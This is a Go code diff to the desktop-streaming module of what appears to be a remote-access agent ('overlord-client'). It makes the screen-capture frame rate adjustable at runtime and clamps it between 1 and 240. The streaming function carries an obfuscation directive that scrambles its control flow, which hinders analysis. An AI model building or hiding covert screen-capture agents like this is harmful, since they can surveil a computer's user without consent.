@@ -6,12 +6,14 @@ import (
 	"overlord-client/cmd/agent/capture"
 	rt "overlord-client/cmd/agent/runtime"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
 var (
 	persistedDisplayValue int
 	persistedDisplayMu    sync.Mutex
+	desktopTargetFPS      atomic.Int64
 )
 
 func persistDisplaySelection(display int) {
@@ -28,21 +30,26 @@ func GetPersistedDisplay() int {
 
 func DesktopStart(ctx context.Context, env *rt.Env) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
-	interval, fps := streamInterval("OVERLORD_DESKTOP_MAX_FPS", 120)
-	if fps < 60 {
-		fps = 60
-		interval = time.Second / time.Duration(fps)
-	}
+	fps := activeDesktopTargetFPS()
+	interval := time.Second / time.Duration(fps)
 	capture.SetH264TargetFPS(fps)
 	log.Printf("desktop: starting stream (target fps %d)", fps)
 	ticker := time.NewTicker(interval)
 	defer ticker.Stop()
+	currentFPS := fps
 	for {
 		select {
 		case <-ctx.Done():
 			log.Printf("desktop: stopping stream")
 			return nil
 		case <-ticker.C:
+			fps := activeDesktopTargetFPS()
+			if fps != currentFPS {
+				currentFPS = fps
+				capture.SetH264TargetFPS(fps)
+				ticker.Reset(time.Second / time.Duration(fps))
+				log.Printf("desktop: target fps changed to %d", fps)
+			}
 			if err := capture.Now(ctx, env); err != nil {
 				if ctx.Err() != nil {
 					log.Printf("desktop: stopping stream")
@@ -52,6 +59,31 @@ func DesktopStart(ctx context.Context, env *rt.Env) error {
 			}
 		}
 	}
+}
+
+func activeDesktopTargetFPS() int {
+	if fps := int(desktopTargetFPS.Load()); fps > 0 {
+		return fps
+	}
+	_, fps := streamInterval("OVERLORD_DESKTOP_MAX_FPS", 120)
+	return SetDesktopTargetFPS(fps)
+}
+
+func SetDesktopTargetFPS(fps int) int {
+	fps = clampDesktopTargetFPS(fps)
+	desktopTargetFPS.Store(int64(fps))
+	capture.SetH264TargetFPS(fps)
+	return fps
+}
+
+func clampDesktopTargetFPS(fps int) int {
+	if fps < 1 {
+		return 1
+	}
+	if fps > 240 {
+		return 240
+	}
+	return fps
 }
 
 func DesktopSelect(ctx context.Context, env *rt.Env, display int) error {
